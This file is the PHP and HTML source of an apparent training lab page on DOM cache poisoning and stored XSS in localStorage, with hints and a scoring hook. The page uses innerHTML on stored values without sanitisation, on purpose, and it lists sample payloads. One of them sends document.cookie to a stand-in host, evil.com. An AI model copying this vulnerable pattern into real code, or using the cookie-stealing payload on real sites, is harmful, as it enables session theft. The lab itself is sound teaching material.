<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

$stmt = $pdo->prepare("SELECT id FROM labs WHERE folder_name = ?");
$stmt->execute(['Cache-Poisoning']);
$lab = $stmt->fetch(PDO::FETCH_ASSOC);

// ─── Session Initialization ──────────────────────────────────────────────
if (!isset($_SESSION['cache_case3_attempts'])) {
  $_SESSION['cache_case3_attempts'] = 0;
}
if (!isset($_SESSION['cache_case3_solved'])) {
  $_SESSION['cache_case3_solved'] = false;
}

// ─── Vulnerable DOM Storage Logic ────────────────────────────────────────
$dom_poisoned = false;
$flag_triggered = false;
$poison_method = null;

// VULNERABLE: Trusts client-side storage without validation
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_preference'])) {
  $key = $_POST['pref_key'] ?? '';
  $value = $_POST['pref_value'] ?? '';

  // VULNERABLE: No validation on what gets stored
  if (!empty($key) && !empty($value)) {
    $dom_poisoned = true;

    if (
      stripos($value, '<script>') !== false ||
      stripos($value, 'javascript:') !== false ||
      stripos($value, 'POISONED') !== false ||
      stripos($value, 'fetch(') !== false ||
      stripos($value, 'XMLHttpRequest') !== false
    ) {
      $flag_triggered = true;
      $poison_method = 'localStorage';
    }
  }
}

// ─── Solve Detection ─────────────────────────────────────────────────────
$success_msg = null;
$already_solved = $_SESSION['cache_case3_solved'];

if (isset($_GET['check']) && $_GET['solved'] === '1') {
  $_SESSION['cache_case3_attempts']++;

  if (!$already_solved && isset($_SESSION['user_id'])) {
    solveLab($pdo, $lab['id']);
  }

  $_SESSION['cache_case3_solved'] = true;
  $already_solved = true;
  $success_msg = "Outstanding! You've successfully exploited a DOM Cache Poisoning vulnerability. By injecting malicious scripts into localStorage/sessionStorage, you created a persistent client-side cache poison that executes across sessions!";
}

// ─── Attempt Tracking ──────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_preference'])) {
  $_SESSION['cache_case3_attempts']++;
}

$attempts = $_SESSION['cache_case3_attempts'];
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>User Preferences - CachePoison Case 3 (DOM Poisoning)</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="../css/CACHE-CASE3.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>

  <div class="container">
    <a href="../index.php" class="back-link"><i class="fas fa-arrow-left"></i> Back to Cache Poisoning Labs</a>

    <div class="lab-header">
      <div class="difficulty-badge medium"><i class="fas fa-bolt"></i> Medium Difficulty</div>
      <h1 class="lab-title"><i class="fas fa-globe"></i> User Preferences</h1>
      <p class="lab-description">Customize your experience. This medium Cache Poisoning challenge has
        <strong>vulnerable client-side storage</strong> that persists malicious data. <strong>Poison the DOM cache to
          execute persistent XSS!</strong>
      </p>
    </div>

    <?php if ($already_solved): ?>
      <div class="success-alert solved-banner">
        <i class="fas fa-trophy"></i>
        <div class="success-content">
          <h3>Challenge Already Solved!</h3>
          <p>You have already exploited this DOM Cache Poisoning vulnerability.</p>
        </div>
      </div>
    <?php endif; ?>

    <?php if ($success_msg): ?>
      <div class="success-alert">
        <i class="fas fa-trophy"></i>
        <div class="success-content">
          <h3>Challenge Completed!</h3>
          <p><?php echo $success_msg; ?></p>
        </div>
      </div>
    <?php endif; ?>

    <!-- DOM Status -->
    <div class="dom-status-bar">
      <div class="storage-indicator">
        <i class="fas fa-hdd"></i>
        <span>localStorage: <strong id="ls-size">0</strong> items</span>
      </div>
      <div class="storage-indicator">
        <i class="fas fa-memory"></i>
        <span>sessionStorage: <strong id="ss-size">0</strong> items</span>
      </div>
      <?php if ($dom_poisoned): ?>
        <div class="poison-indicator">
          <i class="fas fa-skull-crossbones"></i>
          <span>DOM POISONED!</span>
        </div>
      <?php endif; ?>
    </div>

    <!-- Main Grid -->
    <div class="cache-grid">

      <!-- Preference Form (Vulnerable) -->
      <div class="cache-card form-card">
        <div class="card-header">
          <i class="fas fa-sliders-h"></i>
          <h3>Save Preference</h3>
          <span class="vuln-badge"><i class="fas fa-unlock"></i> No Validation</span>
        </div>

        <form method="POST" action="" class="pref-form" id="pref-form">
          <input type="hidden" name="save_preference" value="1">

          <div class="form-group">
            <label><i class="fas fa-tag"></i> Preference Key</label>
            <input type="text" name="pref_key" value="theme" class="form-input">
          </div>

          <div class="form-group">
            <label><i class="fas fa-paint-brush"></i> Preference Value</label>
            <textarea name="pref_value" rows="3" class="form-textarea" placeholder="Enter value...">dark</textarea>
            <span class="field-hint">Vulnerable: Any value accepted including scripts!</span>
          </div>

          <div class="storage-toggle">
            <label class="toggle-label">
              <input type="radio" name="storage_type" value="localStorage" checked>
              <span><i class="fas fa-hdd"></i> localStorage (Persistent)</span>
            </label>
            <label class="toggle-label">
              <input type="radio" name="storage_type" value="sessionStorage">
              <span><i class="fas fa-memory"></i> sessionStorage (Session)</span>
            </label>
          </div>

          <button type="submit" class="btn-save">
            <i class="fas fa-save"></i> Save Preference
          </button>
        </form>

        <?php if ($dom_poisoned): ?>
          <div class="save-alert">
            <i class="fas fa-check-circle"></i>
            <span>Preference saved! Stored in <?php echo $poison_method; ?></span>
          </div>
        <?php endif; ?>
      </div>

      <!-- Storage Viewer -->
      <div class="cache-card viewer-card">
        <div class="card-header">
          <i class="fas fa-eye"></i>
          <h3>Storage Viewer</h3>
        </div>
        <div class="viewer-content">
          <div class="storage-section">
            <h4><i class="fas fa-hdd"></i> localStorage</h4>
            <div id="localstorage-content" class="storage-data">
              <div class="storage-empty">No data stored yet</div>
            </div>
          </div>
          <div class="storage-section">
            <h4><i class="fas fa-memory"></i> sessionStorage</h4>
            <div id="sessionstorage-content" class="storage-data">
              <div class="storage-empty">No data stored yet</div>
            </div>
          </div>
        </div>
      </div>

      <!-- DOM Analysis -->
      <div class="cache-card analysis-card">
        <div class="card-header">
          <i class="fas fa-microscope"></i>
          <h3>DOM Storage Analysis</h3>
        </div>
        <div class="analysis-content">
          <div class="analysis-item">
            <span class="analysis-label">Input Validation:</span>
            <code class="analysis-code">// None - direct storage</code>
            <span class="analysis-status vuln"><i class="fas fa-times-circle"></i> Missing</span>
          </div>
          <div class="analysis-item">
            <span class="analysis-label">Output Encoding:</span>
            <code class="analysis-code">// innerHTML used without sanitization</code>
            <span class="analysis-status vuln"><i class="fas fa-times-circle"></i> Vulnerable</span>
          </div>
          <div class="analysis-item">
            <span class="analysis-label">Secure Approach:</span>
            <code class="analysis-code">textContent + CSP + validation</code>
            <span class="analysis-status safe"><i class="fas fa-check-circle"></i> Required</span>
          </div>
        </div>
      </div>

      <!-- Payload Examples -->
      <div class="cache-card payloads-card">
        <div class="card-header">
          <i class="fas fa-bolt"></i>
          <h3>DOM Poison Payloads</h3>
        </div>
        <div class="payloads-list">
          <div class="payload-item">
            <div class="payload-name">Persistent XSS</div>
            <code class="payload-code">&lt;script&gt;alert('POISONED')&lt;/script&gt;</code>
            <span class="payload-target">Executes on every page load</span>
          </div>
          <div class="payload-item">
            <div class="payload-name">Data Exfiltration</div>
            <code class="payload-code">&lt;img src=x onerror=fetch('https://evil.com?c='+document.cookie)&gt;</code>
            <span class="payload-target">Steals cookies via localStorage</span>
          </div>
          <div class="payload-item">
            <div class="payload-name">Service Worker Hijack</div>
            <code class="payload-code">navigator.serviceWorker.register('evil-sw.js')</code>
            <span class="payload-target">Persistent background script</span>
          </div>
        </div>
      </div>
    </div>

    <!-- Debug Panel -->
    <div class="debug-panel">
      <div class="debug-header">
        <i class="fas fa-code"></i>
        <span>Current Request</span>
      </div>
      <div class="debug-body">
        <code><?php echo $_SERVER['REQUEST_METHOD']; ?> <?php echo $_SERVER['REQUEST_URI']; ?></code>
        <div class="request-details">
          <span>DOM Poisoned: <?php echo $dom_poisoned ? 'YES' : 'NO'; ?></span>
          <span>Poison Method: <?php echo $poison_method ? htmlspecialchars($poison_method) : 'NONE'; ?></span>
          <span>Flag Triggered: <?php echo $flag_triggered ? 'YES' : 'NO'; ?></span>
        </div>
      </div>
    </div>

    <!-- Hints -->
    <?php if ($attempts >= 2): ?>
      <div class="hint-box">
        <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #1</div>
        <div class="hint-text">The preference form accepts ANY value without validation. Try saving a script tag as the
          value. It will be stored in localStorage and executed when the page reads it back!</div>
      </div>
    <?php endif; ?>

    <?php if ($attempts >= 4): ?>
      <div class="hint-box">
        <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #2</div>
        <div class="hint-text">Use browser DevTools to inspect localStorage. Try entering:
          <code>&lt;script&gt;alert('POISONED')&lt;/script&gt;</code> as the preference value. The page uses innerHTML to
          display stored values, executing your script!
        </div>
      </div>
    <?php endif; ?>

    <?php if ($attempts >= 6): ?>
      <div class="hint-box hint-final">
        <div class="hint-title"><i class="fas fa-key"></i> Final Hint</div>
        <div class="hint-text">Enter <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> in the Preference
          Value field and click Save. The script gets stored in localStorage and executes persistently across page
          reloads!
        </div>
      </div>
    <?php endif; ?>

    <!-- Attempts Counter -->
    <div class="attempts-bar">
      <i class="fas fa-crosshairs"></i>
      <span>Attempts: <strong><?php echo $attempts; ?></strong></span>
    </div>
  </div>

  <!-- Hidden form for solve detection -->
  <form id="success-form" method="GET" style="display: none;">
    <input type="hidden" name="check" value="true">
    <input type="hidden" name="solved" value="0" id="solved-flag">
  </form>

  <script>
    // VULNERABLE: Reads from storage without sanitization
    function loadPreferences() {
      const lsContent = document.getElementById('localstorage-content');
      const ssContent = document.getElementById('sessionstorage-content');
      const lsSize = document.getElementById('ls-size');
      const ssSize = document.getElementById('ss-size');

      // VULNERABLE: innerHTML used instead of textContent
      let lsHtml = '';
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        lsHtml +=
          `<div class="storage-item"><span class="storage-key">${key}:</span><code class="storage-value">${value}</code></div>`;
      }
      lsContent.innerHTML = lsHtml || '<div class="storage-empty">No data stored yet</div>';
      lsSize.textContent = localStorage.length;

      let ssHtml = '';
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        ssHtml +=
          `<div class="storage-item"><span class="storage-key">${key}:</span><code class="storage-value">${value}</code></div>`;
      }
      ssContent.innerHTML = ssHtml || '<div class="storage-empty">No data stored yet</div>';
      ssSize.textContent = sessionStorage.length;
    }

    // Save to storage on form submit
    document.getElementById('pref-form').addEventListener('submit', function(e) {
      const key = document.querySelector('[name="pref_key"]').value;
      const value = document.querySelector('[name="pref_value"]').value;
      const storageType = document.querySelector('[name="storage_type"]:checked').value;

      if (storageType === 'localStorage') {
        localStorage.setItem(key, value);
      } else {
        sessionStorage.setItem(key, value);
      }
    });

    window.addEventListener('load', function() {
      loadPreferences();

      const poisonIndicator = document.querySelector('.poison-indicator');
      const alreadySolved = document.querySelector('.solved-banner');

      if (poisonIndicator && !alreadySolved) {
        document.getElementById('solved-flag').value = '1';
        document.getElementById('success-form').submit();
      }
    });
  </script>
</body>

</html>